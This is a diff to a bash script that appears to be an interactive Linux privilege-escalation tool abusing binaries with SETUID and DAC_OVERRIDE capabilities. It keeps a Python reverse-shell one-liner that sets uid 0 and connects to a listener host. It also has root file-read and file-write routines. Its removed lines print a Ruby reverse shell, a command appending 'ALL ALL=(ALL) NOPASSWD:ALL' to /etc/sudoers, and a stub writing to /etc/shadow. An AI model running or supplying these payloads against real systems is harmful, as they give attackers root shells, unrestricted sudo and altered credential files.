@@ -157,6 +157,9 @@ while true; do
             echo "----- < Shell (CAP_SETUID Capability) > -----"
             echo " "
             
+            
+
+            
             if [ -z "$ShellCap" ]; then
                 echo "No Vulnerables Binaries with Capabilities detected"
                 continue
@@ -169,6 +172,7 @@ while true; do
                 select choice in $ShellCap "Go Back"; do
                     case "$choice" in
                         *python*)
+                        
                         
                             echo "Trying with $choice"
                             
@@ -218,23 +222,7 @@ while true; do
                             
                             "$choice" -c 'import sys,socket,os,pty;os.setuid(0);s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 
-                            read -p "Should be done, if the exploit failed, do you want to try another one ? [y/N] : " answer
-
-                            if [[ "$answer" =~ ^[Yy]$ ]]; then
-                                break
-                            else
-                                break 2
-                            fi
-                            ;;
-
-                        *ruby*)
-                            
-                            read -r -p "Set up your listener at $LHOST:$LPORT then press enter"
-                            echo "Trying with $choice"
-                            
-                            "$choice" -rsocket -e 'Process::Sys.setuid(0); exit if fork;c=TCPSocket.new("'$LHOST'",'$LPORT');while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-
-                            read -p "Should be done, if the exploit failed, do you want to try another one ? [y/N] : " answer
+                            read -p "Should be done ! if the exploit failed, do you want to try another one ? [y/N] : " answer
 
                             if [[ "$answer" =~ ^[Yy]$ ]]; then
                                 break
@@ -253,9 +241,13 @@ while true; do
                 done
             done               
             ;;
+
         3)
             echo "----- < File Read (CAP_DAC_OVERRIDE & CAP_SETUID Capabilities) > -----"
             echo " "
+            
+
+
             
             if [ -z "$FileReadCap" ]; then
                 echo "No Vulnerables Binaries with Capabilities detected"
@@ -271,10 +263,13 @@ while true; do
                         *python*)
                         
                             read -p "What file do you want to read ? : " FILE
+
+                            if [[ ! -f "$FILE" ]]; then
+                                echo "Error: file '$FILE' does not exist."
+                                break
+                            fi
                             
-                            echo "Trying with python3..."
-                            echo "Result : "
-                            echo " "
+                            echo "Trying with $choice"
                             
                             "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
                         
@@ -297,9 +292,13 @@ while true; do
                 done 
             done
             ;;
+
         4)
             echo "----- < File Write (CAP_SETUID Capability) > -----"
             echo " "
+            
+
+
             
             if [ -z "$FileWriteCap" ]; then
                 echo "No Vulnerables Binaries with Capabilities detected"
@@ -315,27 +314,23 @@ while true; do
                         *python*)
                         
                             read -p "What file do you want to edit ? : " FILE
-                            
-                            echo "Trying with python3..."
-                            echo "Actual content of the file : "
-                            echo " "
+
+                            if [[ ! -f "$FILE" ]]; then
+                                echo "Error: file '$FILE' does not exist."
+                                break
+                            fi
+
+                            echo "Trying with $choice"
+
                             
                             "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
 
                             while true; do
                                 echo "What do you want to do?"
                             
-                                select ANSWER in "Fully replace the file" "Append data to the file" "Enable sudo ALL" "Create Root Users (WIP)" "Go Back"; do
+                                select ANSWER in "Fully replace the file" "Append data to the file" "Go Back"; do
                                     case "$ANSWER" in
 
-                                        "Enable sudo ALL")
-                                            "$choice" -c 'import os; os.setuid(0); os.system("chmod 777 /etc/sudoers"); open("/etc/sudoers","a").write("\nALL ALL=(ALL) NOPASSWD:ALL"); os.system("chmod 440 /etc/sudoers")'
-                                            break
-                                            ;;
-                                        "Create Root Users (WIP)")
-                                            "$choice" -c 'import os; os.setuid(0);open("/etc/shadow","a").write("\nTBD")'
-                                            break
-                                            ;;
                                         "Fully replace the file")
                                             read -p "What do you want to write into this file ? : " REPLACEFILE
                                             python -c 'import os; os.setuid(0);open("'$FILE'","w+").write("'$REPLACEFILE'")'
@@ -351,7 +346,6 @@ while true; do
                                         "Go Back")
                                             break 2
                                             ;;
-                            
                                         *)
                                             echo "Invalid choice, try again."
                                             break
@@ -360,7 +354,7 @@ while true; do
                                 done
                             done
 
-                            echo "content of the file after modification : "
+                            echo "contents of the file after modification : "
                             echo " "
                             
                             "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
@@ -378,12 +372,13 @@ while true; do
                             ;;
                         *)
                             echo "Invalid Choice, Choose From : "
-                            printf '%s\n' "$FileReadCap" | nl -w2 -s') '
+                            printf '%s\n' "$FileWriteCap" | nl -w2 -s') '
                             ;;
                     esac
                 done 
             done
             ;;
+            
         *)
             echo "Invalid Choice, Restart"
             echo " "
